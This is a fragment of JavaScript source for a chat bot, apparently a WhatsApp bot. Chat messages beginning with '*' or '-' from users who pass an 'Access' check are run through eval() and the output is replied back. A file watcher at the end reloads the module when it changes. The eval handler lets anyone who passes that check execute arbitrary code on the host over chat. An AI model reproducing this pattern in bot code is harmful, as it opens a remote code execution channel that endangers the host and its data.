                if (budy.startsWith('*')) {
                    if (!Access) return;
                    try {
                        let evaled = await eval(budy.slice(2));
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
                        await m.reply(evaled);
                    } catch (err) {
                        m.reply(String(err));
                    }
                }

                if (budy.startsWith('-')) {
                    if (!Access) return
                    let kode = budy.trim().split(/ +/)[0]
                    let teks
                    try {
                        teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
                    } catch (e) {
                        teks = e
                    } finally {
                        await m.reply(require('util').format(teks))
                    }
                }

        }
    } catch (err) {
        console.log(require("util").format(err));
    }
};

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
    require('fs').unwatchFile(file)
    console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m')
    delete require.cache[file]
    require(file)
})